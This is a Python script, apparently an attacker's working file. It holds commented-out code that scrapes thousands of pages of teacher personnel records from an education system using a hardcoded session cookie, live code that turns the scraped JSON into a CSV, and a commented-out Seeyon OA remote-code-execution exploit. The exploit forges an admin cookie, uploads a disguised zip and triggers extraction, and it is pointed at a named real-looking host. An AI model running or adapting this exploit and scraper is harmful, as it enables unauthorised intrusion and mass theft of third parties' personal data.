import re
import traceback

import requests

from utils import print_err, print_suc, print_inf

# ip = 'http://223.202.198.22'
# cookies_ = {
#     'SESSION': 'MjliM2M5N2MtMWIyYS00NjQwLThjMDgtNmU1ZmQ0ZjhkMmM5'
# }
# open('9w.json', 'w', encoding='utf-8').write('')
# w = open('9w.json', 'a', encoding='utf-8')
# texts = ''
# for i in range(1, 8863):
#     c = 0
#     while True:
#         try:
#             dir = '/teacherController/teacherList?page=%s&limit=10&cityId=&areaId=&schoolId=&schoolTypeId=&nationalityId=&politicalAppearanceId=&postNameId=&titleId=&highestEducationId=&subjectId=&highestBachelorId=&keyTeachersId=&postCategoryId=&jobType=&postLevelId=&teacherCertificateTypeId=&mandarinlevelId=&englishLevelId=&selectKey=&status=&provinceId=47' % i
#             res = requests.get(url=ip + dir, cookies=cookies_).text
#             print_suc('%s (%.2f%%)' % (i, (i / 8863) * 100))
#             # print(res)
#             if c <= 10:
#                 if 'error' not in res:
#                     w.write(res + '\n')
#                     c = 0
#                     break
#                 else:
#                     print_inf('错误 重试 %s 行' % i)
#                     c += 1
#             else:
#                 print_err('数据孙环 跳过%s' % i)
#                 c = 0
#                 break
#         except:
#             traceback.print_exc()

import pandas as pd

input = open('9w.json','r',encoding='utf-8',errors=None)
open('9w.csv','w+',encoding='utf-8').write('')
output = open('9w.csv','a',encoding='utf-8',errors=None)
read = input.readlines()
r = ''
i = 0
for it in read:
    try:
        print(it)
        for itt in re.findall('{(.*?)}',it):
            print(i)
            if '"items"' not in itt:
                for ittt in re.findall('":(.*?),',itt):
                    output.write(ittt+',')
                output.write('\n')
                # print('')
                i += 1
    except:
        pass
# # coding: utf-8
# import requests
# import re
# import time
#
# proxy = {
#     'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}
#
# def seeyon_new_rce(targeturl):
#     orgurl = targeturl
#     # 通过请求直接获取管理员权限cookie
#     targeturl = orgurl + 'seeyon/thirdpartyController.do'
#     post={
#     "method":"access","enc":"TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4","clientPath":"127.0.0.1"}
#     response = requests.post(url=targeturl,data=post,proxies=proxy, timeout=60,verify=False)
#     rsp = ""
#     if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
#         cookies = response.cookies
#         cookies = requests.utils.dict_from_cookiejar(cookies)
#         # 上传压缩文件
#         aaa=cookies['JSESSIONID']
#         print(aaa)
#         targeturl = orgurl + 'seeyon/fileUpload.do?method=processUpload'
#         files = [('file1', ('11.png', open('1.zip', 'r'), 'image/png'))]
#         print()
#         headers = {
#     'Cookie':"JSESSIONID=%s"%aaa}
#         data = {
#     'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0',
#                 'isEncrypt': "0"}
#         response = requests.post(url=targeturl,files=files,data=data, headers=headers,proxies=proxy,timeout=60,verify=False)
#         if response.text:
#             reg = re.findall('fileurls=fileurls+","+\'(.+)\'',response.text,re.I)
#             print(reg)
#             if len(reg)==0:
#                 exit("匹配失败")
#             fileid=reg[0]
#             targeturl = orgurl + 'seeyon/ajax.do'
#             datestr = time.strftime('%Y-%m-%d')
#             post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + '%22%2C%22' + fileid + '%22%5D'
#             #headers = {'Cookie': cookies}
#             headers['Content-Type']="application/x-www-form-urlencoded"
#             response = requests.post(targeturl, data=post,headers=headers,proxies=proxy,timeout=60,verify=False)
#             print(response.text)
#
# seeyon_new_rce("http://oa.teacher.com.cn:90/")